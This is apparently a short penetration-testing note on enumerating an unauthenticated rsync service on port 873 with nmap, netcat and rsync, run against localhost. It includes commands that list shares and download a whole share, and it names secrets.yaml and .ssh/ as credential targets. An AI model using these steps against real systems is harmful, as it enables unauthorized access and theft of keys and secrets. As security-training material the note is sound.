# Rsync

**Rsync** is a powerful tool for fast and efficient file transfers, both **locally** and **remotely**. It reduces bandwidth usage by only transferring **differences** between files instead of the entire file.

#### **1. Scanning for Rsync Service**

We can use **nmap** to check if Rsync is running on **port 873:**

```bash
sudo nmap -sV -p 873 127.0.0.1
```

If Rsync is running, it will show:

```bash
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

#### **2. Listing Shared Directories**

Using **Netcat**, we can check what directories are available:

```bash
nc -nv 127.0.0.1 873
```

Output:

```bash
@RSYNCD: 31.0
#list
dev            	Dev Tools
@RSYNCD: EXIT
```

This shows that the **"dev"** share is accessible.

#### **3. Enumerating Files**

We can list files inside "dev":

```bash
rsync -av --list-only rsync://127.0.0.1/dev
```

Potential sensitive files:

* **secrets.yaml** → Might contain passwords or API keys.
* **.ssh/** → Could contain SSH keys for remote access.

#### **4. Downloading Files**

To retrieve all files:

```bash
rsync -av rsync://127.0.0.1/dev .
```

If Rsync is running over SSH:

```bash
rsync -av -e ssh rsync://127.0.0.1/dev .
```

For a non-standard SSH port (e.g., **2222**):

```bash
rsync -av -e "ssh -p2222" rsync://127.0.0.1/dev .
```

By leveraging Rsync misconfigurations, an attacker could retrieve sensitive files and potentially gain access to the target system.
